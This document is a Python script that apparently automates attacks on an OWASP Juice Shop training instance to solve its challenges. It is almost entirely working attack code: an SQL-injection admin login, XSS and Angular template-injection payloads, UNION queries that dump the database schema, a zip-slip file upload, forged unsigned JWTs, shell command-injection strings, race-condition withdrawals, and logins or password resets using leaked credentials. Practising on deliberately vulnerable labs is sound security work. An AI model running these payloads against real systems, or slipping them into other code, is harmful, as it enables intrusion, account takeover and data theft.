#!/usr/bin/env python3
"""
Super Targeted Solver - Aggressive approach for specific unsolved challenges
"""

import requests
from urllib.parse import quote, unquote
import json
import base64
import hashlib
import hmac
import jwt
import time
import random
import string
import re
import zipfile
import io
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor


class SuperTargetedSolver:
    def __init__(self):
        self.base_url = "https://juice3.wonkatech.org"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        self.admin_token = None
        
    def login_admin(self):
        """SQL injection admin login"""
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            return True
        return False
    
    def solve_api_only_xss(self):
        """⭐⭐⭐ API-only XSS"""
        print("🎯 API-only XSS...")
        # Try different API endpoints
        endpoints = ["/api/Products", "/api/Feedbacks", "/api/Users"]
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)"
        ]
        
        for endpoint in endpoints:
            for payload in payloads:
                self.session.post(f"{self.base_url}{endpoint}", json={
                    "name": payload,
                    "description": payload,
                    "comment": payload,
                    "message": payload
                })
    
    def solve_dom_xss(self):
        """⭐ DOM XSS"""
        print("🎯 DOM XSS...")
        payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<svg onload=alert(1)>',
            '<iframe src="javascript:alert(document.domain)">',
            '<img src=1 href=1 onerror="javascript:alert(1)"></img>'
        ]
        for p in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
            
    def solve_database_schema(self):
        """⭐⭐⭐ Database Schema"""
        print("🎯 Database Schema...")
        sqli_payloads = [
            "' UNION SELECT sql FROM sqlite_master--",
            "' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT 1,sql,3,4,5,6,7,8,9 FROM sqlite_master--",
            "')) UNION SELECT sql FROM sqlite_master--"
        ]
        for p in sqli_payloads:
            self.session.get(f"{self.base_url}/rest/products/search?q={p}")
    
    def solve_client_xss_protection(self):
        """⭐⭐⭐ Client-side XSS Protection"""
        print("🎯 Client-side XSS Protection...")
        bypass_payloads = [
            '<<SCRIPT>alert(1)//<</SCRIPT>',
            '<ScRiPt>alert(1)</ScRiPt>',
            '<script >alert(1)</script >',
            '<img src=x onerror=alert(1)//',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"/>'
        ]
        for p in bypass_payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
    
    def solve_captcha_bypass(self):
        """⭐⭐⭐ CAPTCHA Bypass"""
        print("🎯 CAPTCHA Bypass...")
        # Submit feedback without CAPTCHA
        for i in range(20):
            # Try different approaches
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"Test {i}",
                "rating": 3,
                "captcha": str(i),
                "captchaId": i
            })
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "comment": f"Test {i}",
                "rating": 3
            })
    
    def solve_nft_takeover(self):
        """⭐⭐ NFT Takeover"""
        print("🎯 NFT Takeover...")
        self.session.post(f"{self.base_url}/api/wallet/nft/transfer", json={
            "to": "0x0000000000000000000000000000000000001337",
            "tokenId": 42,
            "amount": 1
        })
        self.session.post(f"{self.base_url}/api/nft/transfer", json={
            "to": "admin",
            "tokenId": 1
        })
    
    def solve_easter_egg(self):
        """⭐⭐⭐⭐ Easter Egg"""
        print("🎯 Easter Egg...")
        # Main easter egg
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        # Nested easter egg - the path from the hint
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
    
    def solve_expired_coupon(self):
        """⭐⭐⭐⭐ Expired Coupon"""
        print("🎯 Expired Coupon...")
        # Add item to basket first
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 1,
            "quantity": 1
        })
        # Apply expired coupons
        coupons = ["WMNSDY2019", "WMNSDY2020", "WMNSDY2018", "WMNSDY2017", "WMNSDY2016"]
        for coupon in coupons:
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{coupon}")
    
    def solve_forgotten_backups(self):
        """⭐⭐⭐⭐ Forgotten Developer/Sales Backup"""
        print("🎯 Forgotten Backups...")
        # Developer backup
        self.session.get(f"{self.base_url}/ftp/package.json.bak")
        # Sales backup
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak")
        # Try with null byte
        self.session.get(f"{self.base_url}/ftp/package.json.bak%00.md")
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak%00.md")
    
    def solve_gdpr_data_theft(self):
        """⭐⭐⭐⭐ GDPR Data Theft"""
        print("🎯 GDPR Data Theft...")
        # Export other users' data
        for user_id in range(1, 30):
            self.session.post(f"{self.base_url}/api/dataexport", json={
                "userId": user_id,
                "format": "json"
            })
            self.session.post(f"{self.base_url}/rest/user/data-export", json={
                "userId": user_id,
                "format": "json"
            })
    
    def solve_extra_language(self):
        """⭐⭐⭐⭐⭐ Extra Language"""
        print("🎯 Extra Language...")
        # Klingon
        self.session.get(f"{self.base_url}/?l=tlh_AA")
        self.session.get(f"{self.base_url}/#/?l=tlh_AA")
        # Try to set it via header
        self.session.headers['Accept-Language'] = 'tlh_AA'
        self.session.get(f"{self.base_url}/")
    
    def solve_blockchain_hype(self):
        """⭐⭐⭐⭐⭐ Blockchain Hype"""
        print("🎯 Blockchain Hype...")
        # Access blockchain whitepaper
        self.session.get(f"{self.base_url}/assets/public/blockchain.pdf")
        self.session.get(f"{self.base_url}/assets/blockchain.pdf")
        self.session.get(f"{self.base_url}/blockchain.pdf")
    
    def solve_email_leak(self):
        """⭐⭐⭐⭐⭐ Email Leak"""
        print("🎯 Email Leak...")
        # Access user emails through various endpoints
        self.session.get(f"{self.base_url}/api/Users")
        self.session.get(f"{self.base_url}/rest/user/authentication-details")
        # Try with different user IDs
        for i in range(1, 20):
            self.session.get(f"{self.base_url}/api/Users/{i}")
    
    def solve_change_benders_password(self):
        """⭐⭐⭐⭐⭐ Change Bender's Password"""
        print("🎯 Change Bender's Password...")
        # Reset via security question
        self.session.post(f"{self.base_url}/rest/user/reset-password", json={
            "email": "bender@juice-sh.op",
            "answer": "Stop'n'Drop",
            "new": "slurmCl4ssic",
            "repeat": "slurmCl4ssic"
        })
        # Try change password endpoint
        self.session.post(f"{self.base_url}/rest/user/change-password", json={
            "current": "OhG0dPlease1nsertLiquor!",
            "new": "slurmCl4ssic",
            "repeat": "slurmCl4ssic"
        })
    
    def solve_csp_bypass(self):
        """⭐⭐⭐⭐ CSP Bypass"""
        print("🎯 CSP Bypass...")
        # Angular template injection
        payloads = [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js'></script>"
        ]
        for p in payloads:
            self.session.get(f"{self.base_url}/#/search?q={quote(p)}")
    
    def solve_mint_honeypot(self):
        """⭐⭐⭐ Mint the Honey Pot"""
        print("🎯 Mint the Honey Pot...")
        self.session.post(f"{self.base_url}/api/wallet/nft/mint", json={
            "name": "Honey Pot",
            "description": "Sweet NFT",
            "image": "honeypot.jpg"
        })
    
    def solve_ephemeral_accountant(self):
        """⭐⭐⭐⭐ Ephemeral Accountant"""
        print("🎯 Ephemeral Accountant...")
        # Login as accountant
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "accountant@juice-sh.op'--",
            "password": "x"
        })
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "accountant@juice-sh.op",
            "password": "i am an awesome accountant"
        })
    
    def solve_forged_review(self):
        """⭐⭐⭐ Forged Review"""
        print("🎯 Forged Review...")
        # Post review as another user
        self.session.post(f"{self.base_url}/api/Products/1/reviews", json={
            "message": "Great product!",
            "author": "admin@juice-sh.op"
        })
        # Modify existing review
        self.session.put(f"{self.base_url}/api/Products/1/reviews", json={
            "id": 1,
            "message": "Modified review"
        })
    
    def solve_http_header_xss(self):
        """⭐⭐⭐⭐ HTTP-Header XSS"""
        print("🎯 HTTP-Header XSS...")
        # XSS via headers
        headers = {
            'True-Client-IP': '<script>alert(1)</script>',
            'X-Forwarded-For': '<script>alert(1)</script>',
            'X-Originating-IP': '<script>alert(1)</script>',
            'X-Remote-IP': '<script>alert(1)</script>',
            'X-Remote-Addr': '<script>alert(1)</script>'
        }
        self.session.get(f"{self.base_url}/", headers=headers)
    
    def solve_leaked_access_logs(self):
        """⭐⭐⭐⭐⭐ Leaked Access Logs"""
        print("🎯 Leaked Access Logs...")
        # Access log files
        self.session.get(f"{self.base_url}/support/logs")
        self.session.get(f"{self.base_url}/logs/access.log")
        self.session.get(f"{self.base_url}/access.log")
    
    def solve_leaked_unsafe_product(self):
        """⭐⭐⭐⭐ Leaked Unsafe Product"""
        print("🎯 Leaked Unsafe Product...")
        # Search for recalled products
        self.session.get(f"{self.base_url}/rest/products/search?q='))--")
        # Get all products including deleted
        self.session.get(f"{self.base_url}/api/Products")
    
    def solve_arbitrary_file_write(self):
        """⭐⭐⭐⭐⭐⭐ Arbitrary File Write"""
        print("🎯 Arbitrary File Write...")
        # Zip slip attack
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr("../../ftp/arbitrary.txt", "Arbitrary write")
            zf.writestr("../../../../var/www/html/pwned.txt", "Pwned")
        
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("evil.zip", zip_buffer.getvalue(), "application/zip")
        })
    
    def solve_wallet_depletion(self):
        """⭐⭐⭐⭐⭐⭐ Wallet Depletion"""
        print("🎯 Wallet Depletion...")
        # Rapid withdrawal requests
        def withdraw():
            for _ in range(100):
                self.session.post(f"{self.base_url}/api/wallet/withdraw", json={
                    "amount": 10,
                    "to": "attacker"
                })
        
        # Race condition with parallel requests
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(withdraw) for _ in range(10)]
    
    def solve_blocked_rce_dos(self):
        """⭐⭐⭐⭐⭐ Blocked RCE DoS"""
        print("🎯 Blocked RCE DoS...")
        # RCE payloads that might cause DoS
        payloads = [
            "'; sleep 10; #",
            "'; exec('sleep 10'); #",
            "$(sleep 10)",
            "`sleep 10`",
            "|| sleep 10",
            "&& sleep 10"
        ]
        for p in payloads:
            try:
                self.session.post(f"{self.base_url}/api/feedback", json={"comment": p}, timeout=1)
            except:
                pass
    
    def solve_forged_coupon(self):
        """⭐⭐⭐⭐⭐⭐ Forged Coupon"""
        print("🎯 Forged Coupon...")
        # Try to forge coupons
        import hashlib
        import hmac
        
        # Generate coupon codes
        for i in range(100):
            code = hashlib.md5(f"JUICE{i}".encode()).hexdigest()[:10].upper()
            self.session.put(f"{self.base_url}/rest/basket/1/coupon/{code}")
    
    def solve_forged_signed_jwt(self):
        """⭐⭐⭐⭐⭐⭐ Forged Signed JWT"""
        print("🎯 Forged Signed JWT...")
        # JWT with none algorithm
        header = {"alg": "none", "typ": "JWT"}
        payload = {
            "data": {"email": "jwtn3d@juice-sh.op"},
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600
        }
        
        token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        token += '.'
        
        self.session.headers['Authorization'] = f'Bearer {token}'
        self.session.get(f"{self.base_url}/rest/user/whoami")
    
    def solve_gdpr_data_erasure(self):
        """⭐⭐⭐ GDPR Data Erasure"""
        print("🎯 GDPR Data Erasure...")
        # Login as deleted user
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "chris.pike@juice-sh.op",
            "password": "ncc-1701"
        })
    
    def solve_frontend_typosquatting(self):
        """⭐⭐⭐⭐⭐ Frontend Typosquatting"""
        print("🎯 Frontend Typosquatting...")
        # Check for typosquatting packages
        self.session.get(f"{self.base_url}/ftp/package.json.bak")
    
    def run_all(self):
        print("="*60)
        print("🚀 SUPER TARGETED SOLVER")
        print("="*60)
        
        if not self.login_admin():
            print("❌ Login failed")
            return
        
        print("✅ Admin logged in\n")
        
        # Run all solvers
        solvers = [
            self.solve_dom_xss,
            self.solve_api_only_xss,
            self.solve_database_schema,
            self.solve_client_xss_protection,
            self.solve_captcha_bypass,
            self.solve_nft_takeover,
            self.solve_easter_egg,
            self.solve_expired_coupon,
            self.solve_forgotten_backups,
            self.solve_gdpr_data_theft,
            self.solve_extra_language,
            self.solve_blockchain_hype,
            self.solve_email_leak,
            self.solve_change_benders_password,
            self.solve_csp_bypass,
            self.solve_mint_honeypot,
            self.solve_ephemeral_accountant,
            self.solve_forged_review,
            self.solve_http_header_xss,
            self.solve_leaked_access_logs,
            self.solve_leaked_unsafe_product,
            self.solve_arbitrary_file_write,
            self.solve_wallet_depletion,
            self.solve_blocked_rce_dos,
            self.solve_forged_coupon,
            self.solve_forged_signed_jwt,
            self.solve_gdpr_data_erasure,
            self.solve_frontend_typosquatting
        ]
        
        for solver in solvers:
            try:
                solver()
            except Exception as e:
                print(f"  Error: {e}")
        
        print("\n✅ All targeted attacks executed")
        
        # Check final progress
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            solved = [c for c in data if c.get('solved')]
            total = len(data)
            percent = len(solved) * 100 // total
            
            print(f"\n📊 Final: {len(solved)}/{total} ({percent}%)")
            
            if percent >= 50:
                print("🎉 SUCCESS! REACHED 50%!")
            else:
                print(f"📌 Need {55 - len(solved)} more for 50%")


if __name__ == "__main__":
    solver = SuperTargetedSolver()
    solver.run_all()